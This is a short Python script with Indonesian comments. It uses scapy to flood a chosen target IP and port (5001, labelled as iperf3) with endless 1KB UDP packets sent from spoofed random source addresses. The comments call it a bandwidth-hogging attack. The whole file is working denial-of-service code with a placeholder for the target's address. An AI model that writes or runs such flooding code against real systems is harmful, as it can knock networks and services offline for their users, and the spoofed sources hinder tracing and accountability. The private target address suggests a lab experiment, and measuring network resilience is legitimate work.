from scapy.all import IP, UDP, Raw, send, RandIP, RandShort
import time

# --- KONFIGURASI ---
target_ip = "192.168.0.111"  # GANTI DENGAN IP TARGET ANDA
target_port = 5001           # Menyerang port iperf3 (biar makin kerasa)
# -------------------

# Buat data sampah ukuran 1KB (1024 bytes) per paket
data_sampah = "A" * 1024 

print(f"--- Memulai UDP Flood (Bandwidth Hogging) ke {target_ip} ---")
print("Tekan Ctrl+C untuk berhenti.")

try:
    while True:
        # Paket UDP dengan payload data sampah yang besar
        packet = IP(src=RandIP(), dst=target_ip) / \
                 UDP(sport=RandShort(), dport=target_port) / \
                 Raw(load=data_sampah)

        send(packet, verbose=0)

except KeyboardInterrupt:
    print("\n--- Serangan UDP dihentikan ---")
